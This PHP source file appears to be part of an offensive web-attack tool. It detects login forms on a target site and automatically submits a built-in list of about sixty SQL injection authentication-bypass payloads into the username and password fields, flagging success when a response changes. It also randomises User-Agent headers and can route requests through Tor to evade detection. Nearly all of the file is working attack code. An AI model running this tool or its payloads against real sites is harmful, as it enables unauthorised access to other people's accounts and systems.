<?php

namespace Aszone\Site;

use GuzzleHttp\Client;
use Respect\Validation\Validator as v;
use Symfony\Component\DomCrawler\Crawler;

class Site{

	public $target;

	public $tor;

	public $optionTor;

	public $bodyTarget;

	public function __construct($target)
	{
		$this->target	=$target;
		$this->optionTor=array();
		try{
			$client 		= new Client();
			$this->bodyTarget= $client->get( $this->target,$this->optionTor)->getBody()->getContents();
		}catch(\Exception $e){

			echo $e->getCode()." - page not Found;";

		}

	}


	public function isAdmin($body=false)
	{
		$isUrl   	= v::url()->notEmpty()->validate($this->target);
		if($isUrl)
		{
			if(!$body)
			{
				$existInputPassword = $this->checkInputPassword($this->bodyTarget);
				$existInputUsername = $this->checkInputUsername($this->bodyTarget);
			}
			else
			{
				$existInputPassword = $this->checkInputPassword($body);
				$existInputUsername = $this->checkInputUsername($body);
			}

			if($existInputPassword AND $existInputUsername AND $existInputPassword['actionParentForm']==$existInputUsername['actionParentForm']){
				return true;
			}
		}
		return false;
	}

	public function getNameFieldUsername()
	{
		$resultNameField=false;
		$crawler 	= new Crawler($this->bodyTarget);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField) {
			if($node->attr('name'))
			{
				$validNameField =  $this->verifyListNamesUsername($node->attr('name'));
				$field[$node->attr('name')]=$node->attr('value');
			}
			if(isset($validNameField) AND !empty($validNameField))
			//if($validNameField)
			{
				$resultNameField=$field;
			}
		});
		return $resultNameField;
	}
	public function getNameFieldPassword()
	{
		$resultNameField=false;
		$crawler 	= new Crawler($this->bodyTarget);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField) {
			if($node->attr('name'))
			{
				$validNameField =  $this->verifyListNamesPassword($node->attr('type'));
				$field[$node->attr('name')]=$node->attr('value');
			}

			if(isset($validNameField) AND !empty($validNameField))
			{
				$resultNameField=$field;
			}
		});
		return $resultNameField;
	}

	public function getActionForm()
	{
		$result="";
		$crawler 	= new Crawler($this->bodyTarget);

		$action = $crawler->filter('form')->each(function (Crawler $node, $i) use(&$result)
		{
			if($this->isAdmin($node->parents('form')->html()))
			{
				$result= $this->sanitazeActionForm($node->attr('action'));
			}
		});

		return $result;
	}

	public function bruteForceAll($action,$method,$username,$password,$otherFields)
	{


		$listForInjection=$this->listOfInjectionAdmin();

		$pageControl="";
		foreach($listForInjection as $keyInjetion=> $injetion)
		{
			echo ".";
			$username[key($username)]=$injetion;
			$password[key($password)]=$injetion;
			$dataToPost=array_merge($username,$password,$otherFields);
			$client 	= new Client(['defaults' => [
				'headers' => ['User-Agent' => $this->setUserAgent()],
				$this->optionTor,
				'timeout' => 30
				]
			]);

			if(strcasecmp($method,'post')==0){
				try{
					$body = $client->post($action,array(),$dataToPost)->getBody()->getContents();
					//$headers = $client->post($action,array(),$dataToPost)->getHeader();
					$headers1 = $client->post($action,array(),$dataToPost)->getHeaders();
					if($dataToPost['email']=="' or '1'='1"){
						//var_dump($headers);
						var_dump($headers1);
						var_dump($dataToPost);exit();
					}

				}catch(\Exception $e){
					if($e->getCode()=="404"){
						echo $e->getCode()." - page not Found;";
					}
					break;

				}

			}else{
				try{
					$body = $client->get($action,array(),$dataToPost)->getBody()->getContents();
				}catch(\Exception $e){
					if($e->getCode()=="404"){
						echo $e->getCode()." - page not Found;";
					}
					break;
				}
			}
			if($keyInjetion==0)
			{

				$pageControl=$body;
			}

			if($pageControl!=$body )
			{
				var_dump($pageControl);
				echo "sussefull...\n";
				$resultData['username']=$injetion;
				$resultData['password']=$injetion;
				return $resultData;
			}
		}
		return;
	}

	private function listOfInjectionAdmin()
	{
		$injection[]="zzaa44";
		$injection[]="' or '1'='1";
		$injection[]="' or 'x'='x";
		$injection[]="' or 0=0 --";
		$injection[]='" or 0=0 --';
		$injection[]="or 0=0 --";
		$injection[]='" or 0=0 #';
		$injection[]="or 0=0 #";
		$injection[]="' or 'x'='x";
		$injection[]='" or "x"="x';
		$injection[]='" or 1=1--';
		$injection[]='" or "a"="a';
		$injection[]='") or ("a"="a';
		$injection[]='and 1=1';
		$injection[]="') or ('x'='x";
		$injection[]="' or 1=1--";
		$injection[]="or 1=1--";
		$injection[]="' or a=a--";
		$injection[]="') or ('a'='a";
		$injection[]="hi' or 1=1 --";
		$injection[]="'or'1=1'";
		$injection[]="==";
		$injection[]="and 1=1--";
		$injection[]="' or 'one'='one--";
		$injection[]='hi" or "a"="a';
		$injection[]='hi" or 1=1 --';
		$injection[]='" or 0=0 --';
		$injection[]='" or 0=0 #';
		$injection[]='" or "x"="x';
		$injection[]='" or 1=1--';
		$injection[]="' or 'one'='one";
		$injection[]="' and 'one'='one";
		$injection[]="' and 'one'='one--";
		$injection[]="1') and '1'='1--";
		$injection[]=") or ('1'='1--";
		$injection[]=") or '1'='1--";
		$injection[]="or 1=1/*";
		$injection[]="or 1=1#";
		$injection[]="or 1=1--";
		$injection[]="admin'/*";
		$injection[]="admin' #";
		$injection[]="admin' --";
		$injection[]="') or ('a'='a";
		$injection[]="' or a=a--";
		$injection[]="or 1=1--";
		$injection[]="' or 1=1--";
		$injection[]="') or ('x'='x";
		$injection[]="' or 'x'='x";
		$injection[]="or 0=0 #";
		$injection[]="' or 0=0 #";
		$injection[]="or 0=0 --";
		$injection[]="' or 0=0 --";
		$injection[]="' or 'x'='x";
		$injection[]="' or '1'='1";
		$injection[]='" or "a"="a';
		$injection[]='") or ("a"="a';
		$injection[]='hi" or "a"="a';
		$injection[]='hi" or 1=1 --';
		$injection[]="hi' or 1=1 --";
		$injection[]="'or'1=1'";

		return $injection;
	}

	private function setUserAgent()
	{
		$Browser = parse_ini_file(__DIR__ . "/../resource/UserAgent/Browser.ini");
		$System = parse_ini_file(__DIR__ . "/../resource/UserAgent/System.ini");
		$Locale = parse_ini_file(__DIR__ . "/../resource/UserAgent/Locale.ini");

		$browser=$Browser[rand(0, count($Browser) - 1)];
		$system=$System[rand(0, count($System) - 1)];
		$locale=$Locale[rand(0, count($Locale) - 1)];

		$browserFinal= $browser.'/'.rand(1, 20).'.'. rand(0, 20).' ('. $system. ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locale . ';)';
		//echo $browserFinal;
		return $browserFinal;
	}

	private function sanitazeActionForm($action)
	{
		$explodeUrl=explode("/",$this->target);
		array_pop($explodeUrl);
		$implodeUrl=implode("/",$explodeUrl);
		return $implodeUrl."/".$action;
	}

	public function getMethodForm()
	{
		$crawler 	= new Crawler($this->bodyTarget);
		return $crawler->filter('form')->attr("method");
	}

	public function getOthersField($excludes)
	{

		$crawler 	= new Crawler($this->bodyTarget);

		$dataFields=array();

		//$inputs2 = $crawler->filter('form')->selectButton('input[type=submit]')->form();
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$dataFields,&$excludes) {
			$keyResult=$node->parents()->filter('form')->attr('action');
			if((!$excludes OR ($key = array_key_exists($node->attr('name'), $excludes)) === false))
			{
				$dataFields[$this->sanitazeActionForm($keyResult)][$node->attr('name')]= $node->attr('value');
			}

		});

		return $dataFields;
	}

	private function checkInputPassword($body)
	{
		$checkPassword = false;
		$crawler 	= new Crawler($body);

		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkPassword) {
				if($node->attr('name'))
				{
					$actionForm=$node->parents()->filter('form')->attr('action');
					$validPassword =  $this->verifyListNamesPassword($node->attr('name'));
				}
				if(!$node->attr('name') AND $node->attr('id'))
				{
					$actionForm=$node->parents()->filter('form')->attr('action');
					$validPassword = $this->verifyListNamesPassword($node->attr('id'));
				}
				if(isset($validPassword) AND !empty($validPassword))
				{
					$checkPassword['name']=$validPassword;
					$checkPassword['actionParentForm']=$actionForm;
				}
		});
		return $checkPassword;

	}

	private function verifyListNamesPassword($name)
	{
		$isValid=preg_match("/(.?)pass|password|senha(.?)/i",$name,$m);
		if($isValid)
		{
			return $isValid;
		}
		return false;
	}

	private function checkInputUsername($body)
	{
		$checkUsername=false;
		$crawler 	= new Crawler($body);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkUsername) {
			if($node->attr('name'))
			{
				$actionForm=$node->parents()->filter('form')->attr('action');
				$validUsername =  $this->verifyListNamesUsername($node->attr('name'));
			}
			if(!$node->attr('name') AND $node->attr('id'))
			{
				$actionForm=$node->parents()->filter('form')->attr('action');
				$validUsername = $this->verifyListNamesUsername($node->attr('id'));
			}
			if(isset($validUsername) AND !empty($validUsername))
			{
				$checkUsername['name']=$validUsername;
				$checkUsername['actionParentForm']=$actionForm;
			}
		});
		return $checkUsername;

	}

	private function verifyListNamesUsername($name)
	{
		$isValid=preg_match("/(.?)user|username|login|cpf|email|mail|usuario(.?)/i",$name,$m);
		if($isValid)
		{
			return $isValid;
		}
		return false;
	}




	public function setTor($tor)
	{
		if($tor){
			$this->tor = $tor;
			$this->optionTor=['proxy' => [
				'http' => 'socks5://'.$this->tor['proxy'],
				'https' => 'socks5://'.$this->tor['proxy']
			]];
		}
	}
	
}